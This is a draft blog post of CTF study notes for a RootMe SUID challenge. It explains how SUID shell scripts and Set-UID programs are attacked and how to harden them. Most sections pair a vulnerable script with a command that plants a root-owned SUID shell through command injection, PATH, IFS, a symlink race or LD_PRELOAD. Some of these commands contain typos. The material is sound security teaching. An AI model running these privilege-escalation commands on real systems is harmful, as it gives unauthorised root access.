+++
categories = ["Development", "Programming", "Hacking"]
date = "2015-11-20T18:50:35+01:00"
description = ""
draft = true
image = "/img/about-bg.jpg"
tags = ["programming", "rootme", "challenges", "hack", "crack"]
title = "RootMe Challenge: ELF32 System I"

+++

# ELF32 - System 1 - SUID scripts vulnerabilities

# Resources

## [Danger of SUID Shell Scripts](http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf)

## 1. Never use C-shell for SUID scipts

- Script:
```
$ ls change-pass
-rwsr-x---  1 root helpdesk 37 Feb 26 16:35 change-pass

$ cat change-pass
#!/bin/csh -b
set user = $1
passwd $user
```

- Hack:
```
$ env TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass
```

## 2. Always manually set the PATH and use absolute path names.

- Script:
```
$ cat change-pass
#!/bin/ksh
user=$1
passwd $user
```

- Hack:
```
$ export PATH='/tmp'
$ echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" > /tmp/passwd
$ ./change-pass
```

## 3. Understand how the programs in your script work, escpecially how they handle arguments

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0 ] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:

If the user runs the program and doesn't specify an argument, the program will run the passwd command without any arguments. It default so to the current user, the problem is that in a root-owned SUID script, the current user is always root.

- Script:
```
$ cat change-pass
$!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:

A hacker could write a program that will automatically watch for activity and replace the /tmp/.user file between the ```rm``` and ```echo``` by an empty one. It could not be overwritten and so run as root.

## 4. Don't use temporary files, don't put them in a publicity writable area

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && echo "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack (semi-colon trick):
```
$ change-pass "user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh"
```

## 5. Distrust and check all user input, and strip out any meta-characters

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=${1##*[ \\$/;()|\>\<&    ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack (Internal Filed Separator (IFS) vulnerability):
```
$ export IFS='/'
```

## 6. Always manually set IFS

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
IFS=' '
user=${1##*[ \\$/;()|\>\<&    ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:
```
// Create a link to the SUID script:
$ cd /tmp
ln -s change-pass rootme

// Running the link, quickly replace it with another file:
$ ./rootmer &
& rm rootme && \
  echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh" \
    >> rootme
```

## 7. Don't use SUID shell scripts

There are the more secure options (even more):
  - a wrapper program written in C
  - a Perl script
  - a program like sudo


## [SUID Privileged Programs](http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf)

## 1. How Set-UID Mechanism Works

### Motivations

– You want other people to be able to search some words in your file, but you don’t want them to be able to read the file. How do you achieve this?
– Users’ passwords are stored in/etc/shadow, which is neither readable nor writable to normal users.  However, the passwd program allows users to change their passwords.  Namely, when users run ```passwd```, they can suddenly modify ```/etc/shadow```. Moreover users can only modify one entry in ```/etc/shadow```, but not the other people’s entries. How is this achieved?

### Set-UID programs

– The concept of effective uid and real uid.
– For non Set-UID programs, the effective uid and the real uid are the same.
– For Set-UID programs, the effective uid is the owner of the program, while the real uid is the user of the program.

### Effective User UID and Real User UID

– At login time, the real user ID, effective user ID, and saved user ID of the login process are set to the login ID of the user responsible for the creation of the process.  The same is true for the real, effective, and saved group IDs; they are set to the group ID of the user responsible for the creation of the process.
– When a process calls one of the ```exec``` family of functions to execute a file (program), the user
and/or group identifiers associated with the process can change. If the file executed is a set-user-ID file, the effective and saved user IDs of the process are set to the owner of the file executed.
If the file executed is a set-group-ID file, the effective and saved group IDs of the process are set to the group of the file executed. If the file executed is not a set-user-ID or set-group-ID file, the effective user ID, saved user ID, effective group ID, and saved group ID are not changed.
– Access control is based on effective user IDs and group ID

### How to turn on the Set-UID bit ?

```
$ 4755 file ---> -rwsr-xr-x
```

## 2. Vulnerabilites of Set-UID Programs

### Hidden Inputs: Environment Variables

* ```PATH``` Envronment Variable
```
system("mail");

$ PATH=".:PATH"; export PATH
```

* ```IFS``` Environment Variable
```
$ IFS="/ \t\n"; export IFS

system("/bin/mail root"); ---> system(" bin mail root");
```

* ```LD_LIBRARY_PATH``` Environment Variable
```
$ ldd /bin/ls
$ setenv LD_LIBRARY_PATH .:$LD_LIBRARY_PATH
```

* ```LD_PRELOAD``` Environment Variable
```
$ export LD_PRELOAD=./libmylib.so.1.0.1

// a.c
#include <stdio.h>
void sleep (int s) {
    printf("I am not sleeping!\n");
}

$ gcc -fPIC -g -c a.c
$ gcc -shared -o libmylib.so.1.0.1 a.o -lc

// target.c
int main() {
    sleep(1);
    return(0);
}
```

### Other Well-Known Vulnerability Patterns

* Bufferflow Vulnerability
* Race Condition Vulnerability
* Format-String Vulnerability

### Miscelaneous Vulnerabilities

* ```lpr``` vulnerability
* ```chsh``` vulnerability
* ```sendmail``` vulnerability

## 3. Improving the Security of ```Set-UID``` Programs

* The ```exec``` functions
* Improve the security of system()

## 4. Principle of Least Privilege

> Every program and every user of the system should operate using the least set of privileges necessary to complete the job.

The most important reason for limiting the security privileges your code requires to run is to reduce
the damage that can occur should your code be exploited by a malicious user.  If your code only
runs with basic privileges, its difficult for malicious users to do much damage with it. If you require
users to run your code using administrator privileges, then any security weakness in your code could
potentially cause greater damage by the malicious code that exploits that weakness.

### Questions to ask when writing a privilege program

* Does the program need all the privileges ?
* Does the program need all the privileges ?
* Does the program need the privileges now ?
* Does the program need the privileges in the future ?

### What mechanisms does Unic provide for us to achieve the least-privilege principle ?

Usefule system calls:
  - ```setuid()```
  - ```seteuid()```
  - ```setgid()```
  - ```setegid()```
